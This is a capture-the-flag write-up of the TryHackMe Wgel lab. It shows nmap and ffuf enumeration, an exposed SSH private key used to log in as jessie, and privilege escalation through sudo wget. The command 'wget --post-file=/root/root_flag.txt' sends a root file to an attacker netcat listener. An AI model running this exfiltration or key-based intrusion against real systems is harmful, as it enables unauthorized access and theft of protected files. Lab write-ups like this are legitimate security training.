A very easy CTF lab with exploiting Wget to get the root flag.

Machine Enumeration:

```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ sudo nmap -sS 10.10.188.207 > open_ports.txt
[sudo] password for kali: 
                                                                   
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ cat open_ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 21:29 IST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 21:29 (0:00:00 remaining)
Nmap scan report for 10.10.188.207
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,80 10.10.188.207 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ cat ports_scan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 21:30 IST
Nmap scan report for 10.10.188.207
Host is up (0.44s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (96%), Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Linux 3.10 (93%), Linux 3.12 (93%), Linux 3.18 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.63 seconds
```

SSH and HTTP. Visiting the IP will load the default Apache page, as the title states, `Apache2 Ubuntu Default Page: It works`

Fuzzing the site using Ffuf, we get a subdirectory named sitemap:
```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ ffuf -u http://10.10.188.207/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.188.207/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 452ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 452ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 431ms]
sitemap                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 442ms]
:: Progress: [20476/20476] :: Job [1/1] :: 90 req/sec :: Duration: [0:03:47] :: Errors: 0 ::
```

<img src=https://github.com/user-attachments/assets/2771b28c-8e9d-4b35-92cc-4d7a58d768d4>

Again fuzzing this page for more directories:

```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ ffuf -u http://10.10.188.207/sitemap/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.188.207/sitemap/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 450ms]
.ssh                    [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 451ms]
...
```

Seeing `.ssh`, I guessed I would get the id_rsa file, which I do get from the sub-directory. So, I started looking for a username. Started looking at the source code. In the Apache webpage, I got the username
Jessie

<img src=https://github.com/user-attachments/assets/02cc6988-561a-4913-ae00-62269a081bb6>


<img src=https://github.com/user-attachments/assets/2bc7a80e-5e67-4c7b-ac6c-724195e47457>


```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ nano id_rsa                     
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ chmod 600 id_rsa                                                      
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ ssh -i id_rsa jessie@10.10.188.207
The authenticity of host '10.10.188.207 (10.10.188.207)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.188.207' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$
```

Now is the time for privilege escalation:

```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

I went to GTFOBins to learn how to do priv esca from WGET with SUDO permissions, but it didn't work. Then I searched on net how to do this and I got this:

<img src=https://github.com/user-attachments/assets/62d30a22-8ab6-440a-a741-4c8d90211841>

This was also there in GTFOBins, under the `File Upload` section

```
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.4.101.169
--2024-10-13 19:23:02--  http://10.4.101.169/
Connecting to 10.4.101.169:80... connected.
HTTP request sent, awaiting response...
```

Opening NetCat listener at port 80 on my machine:

```
┌──(kali㉿kali)-[~/Desktop/THM/WgelCTF]
└─$ nc -nlvp 80             
listening on [any] 80 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.188.207] 53036
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.4.101.169
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

<flag>
```
